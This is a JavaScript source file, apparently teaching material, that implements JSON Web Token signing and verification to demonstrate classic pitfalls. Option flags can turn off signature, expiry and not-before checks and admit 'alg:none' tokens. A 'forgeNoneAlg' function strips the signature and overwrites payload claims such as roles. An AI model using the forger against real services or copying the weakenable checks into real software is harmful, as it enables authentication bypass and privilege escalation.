/**
 * Minimal JWT implementation demonstrating the classic pitfalls:
 *   - alg:none acceptance (signature bypass)
 *   - missing exp/nbf validation
 *   - role claim trusted without signature
 */
const enc = new TextEncoder();

export function base64UrlEncode(input) {
  const bytes = typeof input === 'string' ? enc.encode(input) : new Uint8Array(input);
  let binary = '';
  for (let i = 0; i < bytes.length; i += 1) binary += String.fromCharCode(bytes[i]);
  return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

export function base64UrlDecode(input) {
  const padded = String(input).replace(/-/g, '+').replace(/_/g, '/');
  const pad = padded.length % 4 === 0 ? '' : '='.repeat(4 - (padded.length % 4));
  const binary = atob(padded + pad);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
  return new TextDecoder().decode(bytes);
}

async function hmacSha256(secret, data) {
  const key = await crypto.subtle.importKey(
    'raw', enc.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign', 'verify'],
  );
  return new Uint8Array(await crypto.subtle.sign('HMAC', key, enc.encode(data)));
}

export async function sign(payload, secret, { alg = 'HS256', header = {} } = {}) {
  const fullHeader = { alg, typ: 'JWT', ...header };
  const encodedHeader = base64UrlEncode(JSON.stringify(fullHeader));
  const encodedPayload = base64UrlEncode(JSON.stringify(payload));
  const signingInput = `${encodedHeader}.${encodedPayload}`;
  if (alg === 'none') return `${signingInput}.`;
  const signature = await hmacSha256(secret, signingInput);
  return `${signingInput}.${base64UrlEncode(signature)}`;
}

export function decodeUnsafe(token) {
  try {
    const [headerPart, payloadPart, signaturePart = ''] = String(token).split('.');
    return {
      ok: true,
      header: JSON.parse(base64UrlDecode(headerPart)),
      payload: JSON.parse(base64UrlDecode(payloadPart)),
      signature: signaturePart,
      raw: { headerPart, payloadPart, signaturePart },
    };
  } catch (err) {
    return { ok: false, error: err.message };
  }
}

const SAFE_ALGS = ['HS256', 'HS384', 'HS512'];

export async function verify(token, secret, options = {}) {
  const {
    enforceSignature = true,
    allowNoneAlg = false,
    allowedAlgs = SAFE_ALGS,
    checkExp = true,
    checkNbf = true,
  } = options;

  const decoded = decodeUnsafe(token);
  if (!decoded.ok) return { valid: false, reason: 'malformed_token', detail: decoded.error };

  const { header, payload, raw } = decoded;
  const algLower = String(header.alg).toLowerCase();

  if (!allowNoneAlg && algLower === 'none') {
    return { valid: false, reason: 'alg_none_rejected', header, payload };
  }
  if (!allowedAlgs.includes(header.alg) && algLower !== 'none') {
    return { valid: false, reason: 'alg_not_allowed', header, payload };
  }

  if (enforceSignature && algLower !== 'none') {
    const signingInput = `${raw.headerPart}.${raw.payloadPart}`;
    const expected = base64UrlEncode(await hmacSha256(secret, signingInput));
    if (!timingSafeEqual(expected, raw.signaturePart)) {
      return { valid: false, reason: 'bad_signature', header, payload };
    }
  } else if (enforceSignature && algLower === 'none') {
    return { valid: false, reason: 'unsigned_token_rejected', header, payload };
  }

  const now = Math.floor(Date.now() / 1000);
  if (checkExp && typeof payload.exp === 'number' && payload.exp < now) {
    return { valid: false, reason: 'expired', header, payload };
  }
  if (checkNbf && typeof payload.nbf === 'number' && payload.nbf > now + 60) {
    return { valid: false, reason: 'not_yet_valid', header, payload };
  }

  return { valid: true, reason: 'ok', header, payload };
}

function timingSafeEqual(a, b) {
  const sa = String(a); const sb = String(b);
  if (sa.length !== sb.length) return false;
  let diff = 0;
  for (let i = 0; i < sa.length; i += 1) diff |= sa.charCodeAt(i) ^ sb.charCodeAt(i);
  return diff === 0;
}

export function forgeNoneAlg(token, overrides = {}) {
  const decoded = decodeUnsafe(token);
  if (!decoded.ok) return null;
  const header = { ...decoded.header, alg: 'none' };
  const payload = { ...decoded.payload, ...overrides };
  return `${base64UrlEncode(JSON.stringify(header))}.${base64UrlEncode(JSON.stringify(payload))}.`;
}